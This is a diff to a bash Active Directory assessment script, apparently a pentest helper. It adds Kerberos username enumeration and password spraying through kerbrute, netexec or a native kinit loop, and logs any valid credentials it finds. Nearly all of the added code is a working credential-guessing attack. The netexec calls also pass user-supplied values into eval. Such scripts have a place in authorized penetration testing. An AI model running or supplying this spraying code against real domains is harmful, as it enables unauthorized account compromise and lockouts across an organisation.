@@ -29,6 +29,7 @@
 set -u
 
 DOMAIN=""; DC=""; USER=""; PASS=""; HASH=""; KERB=0; OUTBASE="."; JSON=0
+USERLIST=""; SPRAY=""; USERENUM=0
 while [ $# -gt 0 ]; do
   case "$1" in
     -d|--domain) DOMAIN="$2"; shift 2;;
@@ -37,6 +38,9 @@ while [ $# -gt 0 ]; do
     -p|--pass) PASS="$2"; shift 2;;
     -H|--hash) HASH="$2"; shift 2;;
     -k|--kerberos) KERB=1; shift;;
+    --userlist) USERLIST="$2"; shift 2;;      # file of usernames (kerbrute-style)
+    --spray) SPRAY="$2"; shift 2;;            # single password to spray (kerbrute-style)
+    --userenum) USERENUM=1; shift;;           # Kerberos username enumeration
     -o) OUTBASE="$2"; shift 2;;
     -j|--json) JSON=1; shift;;
     -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
@@ -217,6 +221,59 @@ fi
 if has bloodhound-python; then
   flag INFO "bloodhound-python present - collect the graph for path-finding."
   [ -n "$USER" ] && nextstep "BloodHound collect" "bloodhound-python -d $DOMAIN -u $USER -p PASS -ns $DC -c all --zip"
+fi
+
+# ---------- Kerberos user-enum & password spray (kerbrute-style) ----------
+if [ "$USERENUM" = "1" ] || [ -n "$SPRAY" ]; then
+  sect "Kerberos user-enum / password spray (kerbrute-style)"
+  REALM=$(printf '%s' "$DOMAIN" | tr '[:lower:]' '[:upper:]')
+  # resolve a user list: --userlist file, else LDAP-dumped users, else single -u
+  ULIST=""
+  if [ -n "$USERLIST" ] && [ -f "$USERLIST" ]; then ULIST="$USERLIST"
+  elif [ -f "$RUN/01_users_ldap.txt" ]; then awk '/^sAMAccountName:/{print $2}' "$RUN/01_users_ldap.txt" 2>/dev/null | sort -u > "$RUN/.users"; [ -s "$RUN/.users" ] && ULIST="$RUN/.users"
+  elif [ -n "$USER" ]; then printf '%s\n' "$USER" > "$RUN/.users"; ULIST="$RUN/.users"; fi
+  [ -z "$ULIST" ] && flag INFO "No user list (use --userlist file, or run LDAP enum first, or -u)."
+
+  # USER ENUMERATION (prefer real kerbrute, then netexec; both do AS-REQ no-preauth probing)
+  if [ "$USERENUM" = "1" ] && [ -n "$ULIST" ]; then
+    if has kerbrute; then
+      kerbrute userenum -d "$DOMAIN" --dc "$DC" "$ULIST" 2>/dev/null | tee "$RUN/08_userenum.txt" >/dev/null
+      grep -q 'VALID USERNAME' "$RUN/08_userenum.txt" 2>/dev/null && flag MED "Valid usernames enumerated via kerbrute (see 08_userenum.txt)."
+    elif [ -n "$NXC" ]; then
+      eval "$NXC ldap $DC -u '$ULIST' -p '' " 2>/dev/null | tee "$RUN/08_userenum.txt" >/dev/null
+      flag INFO "Attempted user enumeration via $NXC (see 08_userenum.txt)."
+    else
+      flag INFO "No kerbrute/netexec for AS-REQ user enumeration - install kerbrute, or GetNPUsers.py -usersfile."
+      nextstep "Kerberos userenum" "kerbrute userenum -d $DOMAIN --dc $DC users.txt"
+    fi
+  fi
+
+  # PASSWORD SPRAY
+  if [ -n "$SPRAY" ] && [ -n "$ULIST" ]; then
+    COUNT=$(wc -l < "$ULIST" 2>/dev/null)
+    flag INFO "Spraying 1 password across $COUNT user(s). RESPECT LOCKOUT POLICY (see pass-pol) - one attempt per window."
+    if has kerbrute; then
+      kerbrute passwordspray -d "$DOMAIN" --dc "$DC" "$ULIST" "$SPRAY" 2>/dev/null | tee "$RUN/09_spray.txt" >/dev/null
+      grep -q 'VALID LOGIN' "$RUN/09_spray.txt" 2>/dev/null && flag HIGH "VALID credential(s) found by spray (see 09_spray.txt)!"
+    elif [ -n "$NXC" ]; then
+      eval "$NXC smb $DC -u '$ULIST' -p '$SPRAY' --continue-on-success" 2>/dev/null | tee "$RUN/09_spray.txt" >/dev/null
+      grep -qi '\[+\]' "$RUN/09_spray.txt" 2>/dev/null && flag HIGH "VALID credential(s) found by spray (see 09_spray.txt)!"
+    elif has kinit; then
+      # native spray via kinit (no extra tools): success => valid password
+      : > "$RUN/09_spray.txt"; HITS=0
+      while IFS= read -r u; do
+        [ -z "$u" ] && continue
+        if printf '%s' "$SPRAY" | kinit "${u}@${REALM}" >/dev/null 2>&1; then
+          echo "VALID: ${u}:${SPRAY}" | tee -a "$RUN/09_spray.txt"; HITS=$((HITS+1)); kdestroy >/dev/null 2>&1
+        fi
+      done < "$ULIST"
+      [ "$HITS" -gt 0 ] && flag HIGH "$HITS VALID credential(s) found via native kinit spray (see 09_spray.txt)!" || flag INFO "kinit spray: no valid credential for that password."
+    else
+      flag INFO "No kerbrute/netexec/kinit available for spraying."
+      nextstep "Password spray" "kerbrute passwordspray -d $DOMAIN --dc $DC users.txt '$SPRAY'"
+    fi
+  fi
+  rm -f "$RUN/.users" 2>/dev/null
 fi
 
 # ---------- summary ----------
